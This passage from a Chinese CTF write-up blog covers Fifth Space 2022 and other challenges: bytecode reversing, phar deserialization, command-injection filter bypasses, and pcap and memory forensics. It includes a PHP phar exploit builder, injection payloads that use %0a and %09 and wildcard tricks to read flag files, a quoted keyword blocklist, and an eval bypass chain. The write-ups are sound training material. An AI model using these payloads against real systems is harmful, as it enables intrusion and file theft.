class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_each</span>(<span class="params">key, seed, KEY2</span>):</span></span><br><span class="line">    answer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> KEY2:</span><br><span class="line">        password = each</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            result = (i + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span></span><br><span class="line">            <span class="keyword">if</span> password == result:</span><br><span class="line">                answer += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    answer = decrypt_each(KEY1, <span class="number">5</span>, KEY2)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#得到：</span></span><br><span class="line"><span class="comment">#JGpaOILOVEPYTHONSOMUCHK</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此题参考<code>https://l1nwatch.gitbook.io/ctf/idf-shi-yan-shi/reverse-dao-hang-ni-shi/python-bytecode</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unsortheap"><a href="#unsortheap" class="headerlink" title="unsortheap"></a>unsortheap</h3><p>不会</p><h3 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h3><p>不会</p><blockquote><p>这次的题都能搜到，也没啥好说的，太菜了,web也没啥意思<br>感谢我的小伙伴两小时的努力，很强了<br>宇哥太强了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 市赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022第五空间部分wp</title>
      <link href="/2022/09/20/CTFS/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/20/CTFS/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h3 id="5-简单的Base"><a href="#5-简单的Base" class="headerlink" title="5_简单的Base"></a>5_简单的Base</h3><p>十六进制转一下字符串即可</p><p>666c61677b57656c636f6d655f686572657d</p><p>flag{Welcome_here}</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h3><p>考点：phar反序列化</p><p>经过目录扫描发现  <code>www.zip</code></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$down</span> = <span class="keyword">new</span> check_img();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$up</span> = <span class="keyword">new</span> upload();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!in_array(<span class="keyword">$this</span>-&gt;ext, <span class="keyword">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public function __wakeup(){<br>        echo file_get_contents($this-&gt;filename);<br>    }</p><p>因为这里存在wakeup函数，但是又不存在反序列化的点，所以我们使用phar反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在2020年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>; <span class="comment">//要读取的文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> upload();</span><br><span class="line">@unlink(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行此文件，会生成一个shell.phar文件，然后我们将shell.phar，改为jpg文件上传上去，<br>路径为  upload/shell.jpg</p><p>借助<code>phar://</code>执行代码<br><code>img_name=phar://upload_file/phar.gif</code></p><h3 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h3><p>考点：弱口令，rce，过滤目录分隔符/)、 空格</p><p>爆破一下  admin，admin123<br>过滤的分隔符<code>linux中一些命令分隔符：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code><br>过滤的空格，可以用<code>%09(tab)、%09、 $&#123;IFS&#125;、$IFS、$IFS$1、$&#123;IFS&#125;$、&lt;、&lt;&gt;这些都可以当做空格符作为代替。</code><br>过滤了cat，可以用 <code>nl，nl：显示的时候，顺便输出行号</code><br><code>ip=%0anl%09index.php</code><br>可以读取源码，太长，贴一下关键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p><code>ip=%0als</code>  ls的时候有一个kylin目录，目录下有一个flag.txt ，但是不能访问<br>且kylin，flag都被过滤了，我们用问号替换其中一个字符即可<br>绕过目录分隔符的话，先cd 到这个目录，再去cat即可</p><p><code>/?ip=%0acd%09ky?in%0anl%09f?ag.txt</code><br>解法不唯一</p><blockquote><p>参考 phar反序列化<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 第五空间 </tag>
            
            <tag> phar反序列化，rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cqgamectf-1</title>
      <link href="/2022/05/07/CTFS/cqgamectf-1/"/>
      <url>/2022/05/07/CTFS/cqgamectf-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/file|if|localeconv|phpversion|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|var_dump|pos|current|array|time|se|ord/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;What are you thinking?&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Please calm down&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(end(scandir(chr(ceil(sinh(cosh(tan(ceil(tan(ceil(zend_version())))))))))));</span><br></pre></td></tr></table></figure><p><img src="/images/cqgamectf-1/1.png" alt="image-20220402164521180"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 无参数rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OFPPT-CTF-2022-writeup</title>
      <link href="/2022/04/08/CTFS/OFPPT-CTF-2022-writeup/"/>
      <url>/2022/04/08/CTFS/OFPPT-CTF-2022-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="pcap-analysis1"><a href="#pcap-analysis1" class="headerlink" title="pcap analysis1"></a>pcap analysis1</h4><p>考点:流量分析</p><p><a href="/images/ofppt-ctf-2022/pcap-analysis.7z">流量包下载</a></p><p>第一题，因为英语太菜了，这里翻译一下，大致的意思就是被入侵了，然后分析一下，这个人在搜索引擎上查找了什么</p><p><img src="/images/ofppt-ctf-2022/1.png" alt="image-20220408210409793"></p><p>我们这里直接筛选http流量，随便点一个，看到使用的是百度，随便搜索一个名字，就可以看到，wd对应的值就是我们搜索的内容，</p><p><img src="/images/ofppt-ctf-2022/2.png" alt="image-20220408211238126"></p><p><img src="/images/ofppt-ctf-2022/3.png" alt="image-20220408211344064"></p><p><img src="/images/ofppt-ctf-2022/4.png" alt="image-20220408211438318"></p><p>这里我们直接用简单方法，文件导出首选项，下面有全部的url，这里直接抄就行了。</p><p><img src="/images/ofppt-ctf-2022/5.png" alt="image-20220408212025332"></p><p>OFPPT-CTF{charles_geschickter}</p><h4 id="pcap-analysis2"><a href="#pcap-analysis2" class="headerlink" title="pcap analysis2"></a>pcap analysis2</h4><p>wireshark提取ftp流量包</p><p>这里我们可以看到许多ftp的协议，我们直接帅选ftp的流量，往下翻一番，随便找个request包，右键追踪流就可以看到了，</p><p><img src="/images/ofppt-ctf-2022/6.png" alt="image-20220408212631031"></p><p>因为题目的要求是相同文件名，后缀不同，所以就是这两个文件，接下来提取这两包</p><p><img src="/images/ofppt-ctf-2022/7.png" alt="image-20220408212848843"></p><p>这里直接搜索lytton-crypt.bin下面ftpdata就是数据，直接追踪</p><p><img src="/images/ofppt-ctf-2022/8.png" alt="image-20220408213524053"></p><p>调成原始数据，save</p><p><img src="/images/ofppt-ctf-2022/9.png" alt="image-20220408213738041"></p><p>lytton-crypt.bin</p><p>MD5: 4da8e81ee5b08777871e347a6b296953<br>SHA1: 5f88cfb5e469154782aa84a6b649007423c8b196<br>SHA256: 22190203d1789b181eb7230ceeafffe440b33883e185470b7cf64ab22fb3ba9f<br>CRC32: 2859590343</p><p>lytton-crypt.exe 同理</p><p><img src="/images/ofppt-ctf-2022/10.png" alt="image-20220408213950236"></p><p>MD5: 9cb9b11484369b95ce35904c691a5b28<br>SHA1: 4463adb39c4381b87c76180543c401c2bfa89962<br>SHA256: b7da7228ac44bd90aedf34660a04d15bf1ddf84c1a4823234c3abf506a254b8b<br>CRC32: 3745826804</p><blockquote><p>OFPPT-CTF{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</p></blockquote><h4 id="pcap-analysis3"><a href="#pcap-analysis3" class="headerlink" title="pcap analysis3"></a>pcap analysis3</h4><p>The attacker cracked a password belonging to the victim. Submit the flag as: OFPPT-CTF{password}.</p><p>这题就比较简单了，说攻破了密码，我们刚刚在ftp服务器上看到了登陆的痕迹，去找一下密码，直接搜索tcp和200就行，或者utf8也可以，追踪一下，就可以看到登录成功了</p><p><img src="/images/ofppt-ctf-2022/11.png" alt="image-20220408215301907"></p><p><img src="/images/ofppt-ctf-2022/12.png" alt="image-20220408215400191"></p><p>USER cgeschickter</p><p>331 Password required</p><p>PASS darkangel</p><p>230 User logged in.</p><blockquote><p>OFPPT-CTF{darkangel}</p></blockquote><h4 id="pcap-analysis4"><a href="#pcap-analysis4" class="headerlink" title="pcap analysis4"></a>pcap analysis4</h4><p>4这里说执行了一个文件<br>The attacker made a fatal mistake, and in doing so, gave control of his computer to… someone. he shouldn’t have run that malicious program.</p><p>我们在搜索http流量时，找到一个secret_decoder.bin，搜索这个关键字时，发现</p><p><img src="/images/ofppt-ctf-2022/13.png" alt="image-20220408215914265"></p><p><img src="/images/ofppt-ctf-2022/14.png" alt="image-20220408220108310"></p><p>.106的机器在105上执行了命令</p><p><strong>使用wget -O下载并以不同的文件名保存</strong></p><p>这里我们可以看到wget了一个文件且重命名了，之后改了权限，然后增加了定时任务，说明执行的就是这个secret_decoder.bin文件</p><p><img src="/images/ofppt-ctf-2022/15.png" alt="image-20220408220220107"></p><p>这里因为他在最后http请求了这个文件，我们直接导出就行,和ftp导出一样.</p><p><img src="/images/ofppt-ctf-2022/16.png" alt="image-20220408220615646"></p><p>导出之后取一下文件md5就行了</p><p>MD5: 42e419a6391ca79dc44d7dcef1efc83b<br>SHA1: e96c5e687d827f5a250fc643d1e9ff46e2c531bc<br>SHA256: 358489fcab70c3f10c4628e09c1ccbd001915f6adfa7fa97a1be0fb5fbab8198<br>CRC32: 2929409365</p><p><img src="/images/ofppt-ctf-2022/17.png" alt="image-20220408205826205"><br><img src="/images/ofppt-ctf-2022/18.png" alt="image-20220408205858332"></p><blockquote><p>OFPPT-CTF{42e419a6391ca79dc44d7dcef1efc83b}</p></blockquote><h4 id="pcapanalysis5"><a href="#pcapanalysis5" class="headerlink" title="pcapanalysis5"></a>pcapanalysis5</h4><p>The attacker started by performing a port scan of the victim computer.<br>Identify the open TCP ports discovered on the victim’s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt; 10000. Example: OFPPT-CTF{80,110,111,143,443,2049} Use the PCAP file from ‘pcap analysis’ challenge.</p><p>这里我们先推断一下，因为在数据包中106的ip对103的ip进行了ftp密码爆破，所以106为攻击者，103为受害者且假设的为ftp服务。<br>筛选一下目的ip<code>ip.dst == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/19.png" alt="image-20220409211513430"></p><p><img src="/images/ofppt-ctf-2022/20.png" alt="image-20220409212805266"></p><p>可以看到在扫描端口，往下拉一拉会看到请求成功的端口，一共有五个。这里我的方法不推荐，下面这个是一个大师傅的方法，链接<code>https://hhyleung.github.io/writeups/ofppt-ctf-2022/#pcap-analysis-6</code></p><p><img src="/images/ofppt-ctf-2022/21.png" alt="image-20220409213029038"></p><blockquote><p>A port scan is usually done with the TCP handshake, which ends with <code>SYN, ACK</code> if the port is opened. &gt;The filter <code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code> was used to filter out the completed &gt;handshakes and it was found that ports <code>21</code>, <code>135</code>, <code>139</code>, <code>445</code>, and <code>3389</code> were opened.</p></blockquote><p>加上ip就更清晰了<code>tcp.flags.ack == 1 and tcp.flags.syn == 1 and ip.addr == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/22.png" alt="image-20220409214123092"></p><blockquote><p>OFPPT-CTF{21,135,139,445,3389} </p></blockquote><h4 id="pcap-analysis6"><a href="#pcap-analysis6" class="headerlink" title="pcap analysis6"></a>pcap analysis6</h4><p>The attacker might have just bit off more than he can chew! he encountered a competitor that is counter-attacking his system!<br>The competitor executed a command to attain persistence on the attacker’s computer. This command will allow the adversary to regain a connection to the computer even after reboot. What is the packet number where this command was executed? For example: OFPPT-CTF{93721}. Use the PCAP file from ‘pcap analysis’ challenge.</p><p>前面我们知道加了计划任务，也就是直接搜sudo 就可以了，该包的号为160468</p><p><img src="/images/ofppt-ctf-2022/23.png" alt="image-20220409214555530"></p><blockquote><p>OFPPT-CTF{160468} </p></blockquote><h4 id="Windows-memory-dump"><a href="#Windows-memory-dump" class="headerlink" title="Windows memory dump"></a>Windows memory dump</h4><p>A Windows computer has been infected. The attacker managed to exploit a portion of a database backup that contains sensitive employee and customer private information. All memory dump challenges use the same file.<br>Inspect the memory dump and tell us the Windows Major Operating System Version, bit version, and the image date/time (UTC, no spaces or special characters). Submit the flag as OFPPT-CTF{OS_BIT_YYYYMMDDhhmmss}. Example: OFPPT-CTF{WindowsXP_32_20220120095959} File: 1.5 GB Decompressed: 5 GB</p><p>这里取证题，第一次遇到win10的镜像，记录一下</p><p>先看一下镜像信息<code>┌──(root💀bohemian)-[/tools/volatility] └─# python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</code><br>由于这个文件很大 5G,扫描扫了很久，查不多五分钟，我一度以为是我操作不对。后来发现不是，单纯的是因为文件大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_19041</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/tools/ctf/ofppt/physmemraw)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1aa000L</span><br><span class="line">                          KDBG : 0xf8005e600b20L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005ba60000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff82804f9c0000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 2 : 0xffff82804f5e8000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 3 : 0xffff82804f7ca000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-09-07 14:57:44 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2021-09-07 07:57:44 -0700</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到是64位的win10，所以flag</p><blockquote><p>OFPPT-CTF{Windows10_64_20210907145744} </p></blockquote><h4 id="Windows-memory-dump2"><a href="#Windows-memory-dump2" class="headerlink" title="Windows memory dump2"></a>Windows memory 